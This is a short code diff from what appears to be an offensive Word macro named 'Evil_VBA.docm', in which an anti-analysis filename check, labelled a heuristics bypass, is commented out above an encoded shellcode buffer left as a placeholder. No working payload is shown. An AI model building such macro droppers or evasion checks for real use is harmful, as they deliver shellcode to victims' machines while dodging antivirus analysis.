@@ -37,9 +37,9 @@ Function MyMacro()
     Dim Leap As String
 
      'Simple heuristics bypass attempt. Ensure file is named 'app.docm' (in vbObfuscate.ps1)
-    If ActiveDocument.Name <> "Evil_VBA.docm" Then
-        Exit Function
-    End If
+    'If ActiveDocument.Name <> "Evil_VBA.docm" Then
+    '    Exit Function
+    'End If
     ' Our encoded shellcode
 
     buf = ####SHELLCODE####
